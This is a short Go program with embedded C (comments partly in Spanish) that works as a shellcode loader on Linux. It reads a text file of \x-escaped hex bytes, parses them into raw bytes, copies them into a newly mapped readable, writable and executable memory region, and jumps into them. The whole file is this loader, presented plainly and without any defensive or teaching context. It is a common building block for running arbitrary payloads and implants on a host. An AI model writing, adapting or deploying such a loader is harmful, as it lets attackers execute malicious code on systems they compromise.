//go:build linux

package main

import (
    "fmt"
    "io/ioutil"
    "os"
    "strconv"
    "unsafe"
)

/*
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

static void execute_shellcode(unsigned char* sc, unsigned int sc_len) {
    void *memory = mmap(NULL, sc_len, PROT_READ | PROT_WRITE | PROT_EXEC, 
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (memory == MAP_FAILED) return;
    
    memcpy(memory, sc, sc_len);
    ((void(*)())memory)();
}
*/
import "C"

func executeLoader(shellcodeFile string) {
    shellcode, err := readShellcodeFromFile(shellcodeFile)
    if err != nil {
        fmt.Printf("Error reading shellcode file: %v\n", err)
        os.Exit(1)
    }
    
    if len(shellcode) == 0 {
        fmt.Printf("Error: No shellcode bytes found in file\n")
        os.Exit(1)
    }
    
    fmt.Printf("Loaded %d bytes of shellcode\n", len(shellcode))
    
    C.execute_shellcode(
        (*C.uchar)(unsafe.Pointer(&shellcode[0])),
        C.uint(len(shellcode)),
    )
}

func readShellcodeFromFile(filename string) ([]byte, error) {
    content, err := ioutil.ReadFile(filename)
    if err != nil {
        return nil, err
    }
    
    text := string(content)
    var shellcode []byte
    
    // Método simple y robusto: buscar todos los \x## 
    for i := 0; i < len(text)-3; i++ {
        if text[i] == '\\' && text[i+1] == 'x' {
            // Extraer los siguientes 2 caracteres hexadecimales
            hexStr := text[i+2:i+4]
            if len(hexStr) == 2 {
                if b, err := strconv.ParseUint(hexStr, 16, 8); err == nil {
                    shellcode = append(shellcode, byte(b))
                }
            }
            i += 3 // Saltar los 4 caracteres ya procesados (\x##)
        }
    }
    
    return shellcode, nil
}
